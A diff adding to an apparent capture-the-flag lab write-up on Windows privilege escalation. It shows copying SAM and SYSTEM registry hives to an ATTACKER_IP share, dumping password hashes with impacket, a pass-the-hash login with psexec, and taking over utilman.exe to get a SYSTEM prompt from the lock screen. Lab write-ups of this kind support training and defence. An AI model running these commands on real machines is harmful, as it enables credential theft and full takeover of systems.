@@ -126,3 +126,47 @@ This will create a share named public pointing to the share directory, which req
 C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
 C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
 ```
+
+And use impacket to retrieve the users' password hashes:
+
+```JavaScript
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
+
+```JavaScript
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.13.127
+```
+
+## SeTakeOwnership
+
+The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.
+
+Check your privileges
+
+```JavaScript
+whoami /priv
+```
+
+- We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen
+- Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.
+- To replace utilman, we will start by taking ownership of it with the following command:
+
+```JavaScript
+takeown /f C:\Windows\System32\Utilman.exe
+```
+
+Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
+
+```JavaScript
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+```
+
+Now replace utilman.exe with a copy of cmd.exe:
+
+```JavaScript
+copy cmd.exe utilman.exe
+```
+
+To trigger utilman, lock your screen from the start button. Afterwards, click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
